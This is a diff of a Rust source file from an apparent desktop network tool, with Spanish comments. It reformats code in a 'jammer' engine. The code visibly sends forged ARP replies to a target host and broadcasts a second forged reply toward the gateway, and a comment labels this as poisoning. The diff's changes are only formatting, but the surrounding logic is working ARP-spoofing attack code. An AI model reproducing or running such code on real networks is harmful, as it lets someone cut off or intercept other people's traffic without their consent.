@@ -1,8 +1,8 @@
 // src-tauri/src/infrastructure/network/jammer_engine.rs
 // Descripcion: implementacion "real" del jammer usando pnet + PacketInjector. Expuesto a application via `JammerPort`.
 
-use crate::domain::ports::JammerPort;
 use crate::domain::ports::HostIdentityPort;
+use crate::domain::ports::JammerPort;
 use crate::infrastructure::network::packet_injector::PacketInjector;
 use pnet::datalink;
 use pnet::util::MacAddr;
@@ -87,7 +87,10 @@ impl PnetJammerEngine {
                         Ok(identity) => {
                             let interfaces = datalink::interfaces();
                             let interface = interfaces.into_iter().find(|iface| {
-                                iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
+                                iface
+                                    .ips
+                                    .iter()
+                                    .any(|ip| ip.ip().to_string() == identity.ip)
                             });
 
                             cached_iface = interface;
@@ -126,11 +129,17 @@ impl PnetJammerEngine {
                     }
 
                     // Enviamos ARP Reply falsificado al objetivo (poisoning).
-                    PacketInjector::send_fake_arp(&iface, target_mac, target_ip, my_mac, gateway_ip);
+                    PacketInjector::send_fake_arp(iface, target_mac, target_ip, my_mac, gateway_ip);
 
                     // Segundo envio: al gateway, usando broadcast ethernet (best-effort).
                     let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
-                    PacketInjector::send_fake_arp(&iface, broadcast_mac, gateway_ip, my_mac, target_ip);
+                    PacketInjector::send_fake_arp(
+                        iface,
+                        broadcast_mac,
+                        gateway_ip,
+                        my_mac,
+                        target_ip,
+                    );
                 }
 
                 // Cadencia conservadora para no saturar el host local.
